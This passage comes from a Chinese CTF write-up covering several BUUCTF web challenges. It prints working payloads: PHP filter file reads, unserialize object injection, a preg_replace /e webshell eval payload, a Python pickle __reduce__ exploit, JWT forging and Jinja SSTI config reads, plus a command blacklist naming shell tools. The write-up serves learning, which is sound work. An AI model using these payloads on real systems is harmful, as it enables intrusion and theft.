class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过审计代码可知：需要<code>GET</code>方式上传三个参数<code>text</code>、<code>file</code>、<code>password</code>，并且三个参数需要满足：</p><ul><li><code>text</code>参数传入的值会用<code>file_get_contents</code>去访问，初步猜测是<code>远程文件读取</code>，后来测试发现这里不行，需要用伪协议；</li><li><code>file</code>参数可以传入文件名，这个文件会被<code>include()</code>包含，看到这猜测肯定有文件包含，并且提示了<code>useless.php</code>，肯定是要看它的代码的；</li><li><code>password</code>会进行反序列化，还没看出他的用处。</li></ul><h3 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h3><p>首先构造payload：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/?<span class="attribute">text</span>=data:text/plain,welcome <span class="keyword">to</span> the zjctf&amp;<span class="attribute">file</span>=php://filter/convert.base64-encode/resource=useless.php&amp;passwprd=1</span><br></pre></td></tr></table></figure><p>成功读取到<code>useless.php</code>的代码，如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们看到，这里构造了一个<code>Flag</code>类，并且在此处可以读到<code>flag.php</code>的内容，由此得知<code>password</code>传入的肯定是此处序列化的内容，可以用下面的代码拿到序列化的字符串：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">"flag.php"</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后再构造payload读取flag：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">/?<span class="built_in">text</span>=data:<span class="built_in">text</span>/plain,welcome <span class="keyword">to</span> <span class="keyword">the</span> zjctf&amp;<span class="built_in">file</span>=useless.php&amp;password=O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>查看源码拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web41.png" alt=""></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>是上道题的改版，原题是支持<code>远程文件读取</code>的，但是放到<code>BUU</code>上好像不行了… 这道题在上道题的基础上考了<code>preg_replace()</code>的RCE。<br>本RCE参考：<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先看代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相同的操作拿到<code>next.php</code>的源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们看到语句<code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str)</code>中采用了<code>preg_replace/e</code>模式，因此可以利用上面提到的RCE来写入小马，构造payload如下：</p><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">next</span>.php?id=<span class="number">1</span>&amp;\S*=$&#123;<span class="built_in">eval</span>($_POST[x])&#125;</span><br></pre></td></tr></table></figure><p>这样构造的原因：</p><ul><li><code>preg_replace</code>函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图preg_replace函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code>字符串，就需要想办法来执行它。</li><li>上面的命令执行，相当于<code>eval(&#39;strtolower(&quot;\\1&quot;);&#39;)</code>结果，当中的<code>\\1</code>实际上就是<code>\1</code>，而<code>\1</code>在正则表达式中有自己的含义：<blockquote><p>对一个正则表达式模式或部分模式<strong>两边添加圆括号</strong>将导致相关<strong>匹配存储到一个临时缓冲区中</strong>，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从<code>1</code>开始，最多可存储<code>99</code>个捕获的子表达式。每个缓冲区都可以使用<code>&#39;\n&#39;</code>访问，其中<code>n</code>为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote></li><li>所以这里的<code>\1</code>实际上指定的是第一个子匹配项，参考前面的链接，我们传入<code>\S*=${eval($_POST[x])}</code>便可以将小马写入(<code>S</code>原本是<code>.</code>，但是传参数首字符是特殊字符的时候会被替换为<code>_</code>，用<code>S</code>可以绕过)。</li></ul><h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><p>用上面的payload写入小马，然后用蚁剑连接拿到shell，即可拿到flag。注意这里我们并没有把上面的语句写入到指定的文件，而是访问的时候<code>${eval($_POST[x])}</code>语句首先被执行了，因此才可以连接上，那么我们连接的时候用的也就是整个<code>url</code>了。</p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>考察<code>is_numeric()</code>和<code>strcmp()</code>两个函数的漏洞</p><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><ul><li><p>php中的strcmp漏洞</p><blockquote><p>传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数接受到了不符合的类型将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，仍将<code>return 0</code>（表示两个字符串相等）。那么利用数组即可绕过判断。</p></blockquote></li><li><p>php中的is_numeric()漏洞</p><blockquote><p><code>is_numeric</code>函数对于空字符<code>%00</code>，无论是<code>%00</code>放在前后都可以判断为非数值，而<code>%20</code>空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断。</p></blockquote></li></ul><h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>在<code>PAYFLAG</code>页面源码中发现如下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示我们传入<code>money</code>和<code>password</code>，可以看到利用<code>password=404%20</code>即可绕过<code>is_numeric</code>的判断。<br>抓包发现<code>cookie</code>值为<code>0</code>，而并没有采用<code>PHPSESSID</code>，将其改为<code>1</code>即可，发送之后回显如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web42.png" alt=""><br>从中看到了对<code>money</code>的判断，看到PHP版本是5.3的，猜测是<code>strcmp</code>函数比较的，利用数组绕过即可。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web43.png" alt=""><br>成功拿到flag。**其实对于money的绕过还可以采用科学计数法<code>money=1e11</code>。</p><h2 id="CISCN-2019-ikun"><a href="#CISCN-2019-ikun" class="headerlink" title="[CISCN 2019]ikun"></a>[CISCN 2019]ikun</h2><p>考察<strong>薅羊毛逻辑漏洞</strong>：通过抓包修改折扣等数据来购买flag；<strong>jwt-cookies伪造</strong>、<strong>python反序列化</strong></p><h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后提示要买到<code>lv6</code><br><img src="http://www.ggb0n.cool/images/BUUCTF-web51.png" alt=""><br>我们看到每个商品都有个等级的标签，查看标签命名是<code>lvx.png</code>，因此若要找到<code>lv6</code>的地方，可以用下面的脚本代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://6e7db183-764d-4afc-bdbb-b70791536e4a.node3.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">    r=requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">       <span class="keyword">print</span> (i)</span><br><span class="line">       <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑出来<code>lv6</code>在181页，但是发现太贵了…<br>抓包发现可以设置折扣，这里就用到了<strong>薅羊毛逻辑漏洞</strong>。<br>然后页面返回提示需要是<code>admin</code><br><img src="http://www.ggb0n.cool/images/BUUCTF-web52.png" alt=""><br>抓包发现cookie采用了<code>JWT</code>(此处可了解<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">JWT</a>)，我们把<code>JWT</code>拿去base64解码得到</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"alg"</span>:<span class="string">"HS256"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;&#123;<span class="string">"username"</span>:<span class="string">"123"</span>&#125;¶«<span class="attribute">L</span>=mð¢ÖÙJhÎö7Éq"&gt;[¿</span><br></pre></td></tr></table></figure><p>其中<code>username</code>中是我们登录的用户名，等下伪造<code>JWT</code>时改为<code>admin</code>即可；<br>另外，伪造<code>JWT</code>还需要秘钥，可以利用<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>来破解：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web53.png" alt=""><br>拿到秘钥之后，到<a href="https://jwt.io/">JWT生成网站</a>伪造admin的JWT：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web54.png" alt=""><br>拿伪造的<code>JWT</code>伪装成管理员，然后得到了一个压缩包的地址：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web55.png" alt=""></p><p>然后需要<code>成为大会员</code>，BP抓包发现是利用<code>become</code>传参，在源码的<code>Admin.py</code>中找到了这个参数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">        p = pickle.loads(urllib.unquote(become))</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>我们看到，这个地方利用了<code>pickle.loads</code>对<code>become</code>传参进行反序列化(关于<a href="https://blog.csdn.net/weixin_38278334/article/details/82967813">pickle</a>)，现在就需要构造可读取flag文件的序列化字符串赋给<code>become</code>利用Python反序列化的漏洞拿到flag。</p><h3 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h3><p><img src="http://www.ggb0n.cool/images/BUUCTF-web57.png" alt=""><br>从图中看到：我们可以利用<strong><strong>reduce</strong></strong>，当<strong>reduce</strong>被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt，EXP如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = parse.quote(a)</span><br><span class="line"><span class="keyword">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><p>生成payload：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span>open%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A.</span><br></pre></td></tr></table></figure><p>利用前面伪造的<code>JWT</code>同时将上面的payload传给参数become即可拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web56.png" alt=""><br>关于Python反序列化漏洞的参考：<br><strong>Pickle反序列化漏洞</strong>：<a href="https://xz.aliyun.com/t/2289">https://xz.aliyun.com/t/2289</a><br><strong>cPickle反序列化漏洞</strong>：<a href="https://blog.csdn.net/SKI_12/article/details/85015803">https://blog.csdn.net/SKI_12/article/details/85015803</a><br><strong>Python-sec的一些总结</strong>：<a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>考察<code>unicode</code>安全问题，参考如下链接：<br><a href="https://xz.aliyun.com/t/5402">浅谈Unicode设计的安全性</a><br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicode等价性浅谈</a><br><a href="http://unicode.org/reports/tr36/tr36-3.html#Numeric_Spoofs">UNICODE SECURITY CONSIDERATIONS</a></p><h3 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h3><p>查看源码发现在<code>charset=UTF-8</code>处提示<code>Ah,really important,seriously.</code>，说明是考察与unicode安全相关的知识，再看题目页面，可以买四种独角兽，但是前三种价格都是一位数，而第四个却是四位数，猜测flag就在第四个。<br>但是输入框只能输入一个字符，参考网上的资料，到前面的网站找一个大于1337的特殊unicode字符，然后将其进行url编码填入输入框拿到flag。<br>可以去<a href="https://www.compart.com/en/unicode/">这里</a>找。</p><h2 id="WesternCTF-2018-shrine"><a href="#WesternCTF-2018-shrine" class="headerlink" title="[WesternCTF 2018]shrine"></a>[WesternCTF 2018]shrine</h2><p>考察<code>SSTI</code>服务端模板注入，参考<a href="https://www.cnblogs.com/wangtanzhi/p/12238779.html">https://www.cnblogs.com/wangtanzhi/p/12238779.html</a></p><h3 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) </span><br><span class="line">        + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>可以看到<code>/shrine/</code>路径下存在对用户输入到模板数据的过滤，<code>(</code>、<code>)</code>被替换为空，<code>config</code>、<code>self</code>都被黑名单过滤掉，但是还是避免不了存在SSTI，先拿一个数学表达式测试一下：<code>2</code>，发现可以执行。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web58.png" alt=""><br>接着看代码，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br></pre></td></tr></table></figure><p>这里注册一个名为<code>FLAG</code>的<code>config</code>，flag应该就在这，这个地方原本可以直接通过<code></code>读取所有<code>app.config</code>的内容的，但是前面说过<code>config</code>已经被过滤了：下面这行代码就是将<code>config</code>和<code>self</code>替换为空。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])</span><br></pre></td></tr></table></figure><p>但是这里黑名单过滤的内容比较少，其实还有其他内置函数能实现同样的功能，如<strong>url_for</strong>和<strong>get_flashed_messages</strong><br>关于这两个函数可以参考：<a href="https://www.jianshu.com/p/bcf57a3092ce">https://www.jianshu.com/p/bcf57a3092ce</a></p><h3 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h3><p>直接上payload了</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br><span class="line"><span class="regexp">/shrine/</span>&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>读取到flag如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web59.png" alt=""><br><code>PHP</code>中也有很多模板渲染的漏洞，以后遇到了慢慢学吧。<br>附上一个模板注入点扫描工具<a href="https://github.com/epinna/tplmap">tplmap</a></p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>考察多次编码，<code>MD5</code>强碰撞</p><h3 id="题目分析-9"><a href="#题目分析-9" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后，看题目的url发现了可疑的参数<code>img</code>和<code>cmd</code>，并且<code>img</code>的值是一串base64，解码之后还是base64，再解码拿到一串hex码，最终解码是<code>555.png</code>，这就说明，读取文件的时候是先进行hex编码，然后两次base64编码传参，那么我们利用这个特点就可以读其他文件了。<br>先看<code>index.php</code>的内容，三次编码传参之后拿到源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以看到<code>preg_match(&quot;/flag/i&quot;, $file)</code>说明flag在<code>/flag</code>中，同时</p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="symbol">\'</span>|<span class="symbol">\"</span>|<span class="symbol">\`</span>|;|,|<span class="symbol">\*</span>|<span class="symbol">\?</span>|<span class="symbol">\\</span>|<span class="symbol">\\</span><span class="symbol">\\</span>|<span class="symbol">\n</span>|<span class="symbol">\t</span>|<span class="symbol">\r</span>|<span class="symbol">\x</span>A0|<span class="symbol">\&#123;</span>|<span class="symbol">\&#125;</span>|<span class="symbol">\(</span>|<span class="symbol">\)</span>|<span class="symbol">\&amp;</span>[^<span class="symbol">\d</span>]|@|<span class="symbol">\|</span>|<span class="symbol">\\</span>$|<span class="symbol">\[</span>|<span class="symbol">\]</span>|&#123;|&#125;|<span class="symbol">\(</span>|<span class="symbol">\)</span>|-|&lt;|&gt;/i", <span 